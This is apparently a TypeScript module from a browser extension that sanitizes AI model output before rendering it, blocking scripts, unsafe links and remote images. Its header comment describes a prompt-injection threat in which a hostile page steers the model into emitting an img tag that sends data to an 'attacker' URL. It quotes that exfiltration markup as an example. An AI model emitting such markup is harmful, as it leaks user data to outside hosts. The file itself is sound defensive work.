/**
 * The one Markdown → DOM path of the side panel.
 *
 * Model output is untrusted: the page being read is part of the prompt, so a
 * hostile page can steer the model into emitting raw HTML. `marked` passes
 * HTML through untouched, and MV3's default extension-page CSP only restricts
 * scripts — an `<img src="https://attacker/?d=…">` in an answer would load
 * (and leak whatever the model put in the URL) the moment it is rendered.
 *
 * Every string that ends up in `innerHTML` as rendered Markdown or as a
 * stored HTML snapshot goes through here:
 *   - DOMPurify strips scripts, event handlers, `style`, forms and embeds;
 *   - links open in a new tab, `rel="noopener noreferrer"`, and only
 *     http(s) / mailto hrefs survive;
 *   - remote images are never loaded — they become a link the user can open
 *     deliberately (data: / blob: images, which cannot leak, stay inline).
 */

import { Marked } from 'marked';
import createDOMPurify from 'dompurify';
import { t } from '../../shared/i18n.js';

const markdown = new Marked({ breaks: true, gfm: true });

const SAFE_LINK = /^(?:https?:|mailto:)/i;
const INLINE_IMAGE = /^(?:data:image\/|blob:)/i;

let _purifier: ReturnType<typeof createDOMPurify> | null = null;

function purifier(): ReturnType<typeof createDOMPurify> {
  if (_purifier) return _purifier;
  const p = createDOMPurify(window);
  // Runs inside DOMPurify's inert parsing document: only attributes are
  // touched here (no node replacement mid-iteration). Remote images lose
  // their `src` before anything could fetch it and are swapped for links
  // afterwards, again in an inert document.
  p.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A') {
      const href = (node.getAttribute('href') || '').trim();
      if (href && !SAFE_LINK.test(href)) node.removeAttribute('href');
      node.setAttribute('target', '_blank');
      node.setAttribute('rel', 'noopener noreferrer');
    } else if (node.tagName === 'IMG') {
      const src = (node.getAttribute('src') || '').trim();
      if (INLINE_IMAGE.test(src)) return;
      node.removeAttribute('src');
      node.removeAttribute('srcset');
      node.setAttribute(BLOCKED_ATTR, src);
    }
  });
  _purifier = p;
  return p;
}

const BLOCKED_ATTR = 'data-blocked-src';

/** Replace each neutralized remote image with a link — nothing is fetched until the user clicks. */
function linkifyBlockedImages(html: string): string {
  if (!html.includes(BLOCKED_ATTR)) return html;
  const tpl = parseInertHtml(html);
  const doc = tpl.content.ownerDocument;
  tpl.content.querySelectorAll(`img[${BLOCKED_ATTR}]`).forEach((img) => {
    const src = img.getAttribute(BLOCKED_ATTR) || '';
    const label = t('markdown.blockedImage', { alt: img.getAttribute('alt') || src });
    if (!SAFE_LINK.test(src)) {
      img.replaceWith(doc.createTextNode(label));
      return;
    }
    const a = doc.createElement('a');
    a.className = 'md-blocked-image';
    a.setAttribute('href', src);
    a.setAttribute('target', '_blank');
    a.setAttribute('rel', 'noopener noreferrer');
    a.textContent = label;
    img.replaceWith(a);
  });
  return tpl.innerHTML;
}

/** Sanitize an HTML string (rendered Markdown or a legacy stored snapshot). */
export function sanitizeHtml(html: string): string {
  const clean = purifier().sanitize(html, {
    FORBID_TAGS: ['style', 'form', 'input', 'button', 'textarea', 'select', 'option'],
    FORBID_ATTR: ['style'],
  }) as string;
  return linkifyBlockedImages(clean);
}

/** Render Markdown to sanitized HTML, ready for `innerHTML`. */
export function renderMarkdown(src: string): string {
  return sanitizeHtml(markdown.parse(src, { async: false }) as string);
}

/**
 * Parse an untrusted HTML string into an inert `<template>`. Unlike a
 * `document.createElement('div')`, a template's content belongs to an inert
 * document: images are not fetched and nothing executes while it is
 * inspected. Read the (possibly modified) markup back with `tpl.innerHTML`.
 */
export function parseInertHtml(html: string): HTMLTemplateElement {
  const tpl = document.createElement('template');
  tpl.innerHTML = html;
  return tpl;
}
